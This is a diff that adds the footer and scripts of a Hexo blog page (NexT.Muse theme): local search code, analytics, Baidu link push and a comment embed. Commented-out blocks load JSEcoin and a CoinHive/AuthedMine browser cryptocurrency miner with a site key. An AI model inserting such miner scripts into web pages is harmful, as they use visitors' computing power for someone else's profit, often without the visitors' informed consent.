+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+<br>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<!--
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+-->
+<!--
+<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/39357/kevien.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+-->
+
+<!--
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('uTu9h9LT1kVUk4O1UxyZAhd8uvoLLip5', {throttle: 0.3});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
+-->
+
+
+<!--<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="https://kevien.github.io/static/api/js/canvas-nest.min.js"></script>-->
+<script src="https://kevien.github.io/static/api/js/love.js"></script>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+     <!-- 来必力City版安装代码 -->
+     <!--
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU4MS82MTQ5">
+        <script type="text/javascript">
+         (function(d, s) {
+             var j, e = d.getElementsByTagName(s)[0];
+
+             if (typeof LivereTower === 'function') { return; }
+
+             j = d.createElement(s);
+             j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+             j.async = true;
+
+             e.parentNode.insertBefore(j, e);
+         })(document, 'script');
+        </script>
+      <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>
+      -->
+<!-- City版安装代码已完成 -->
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
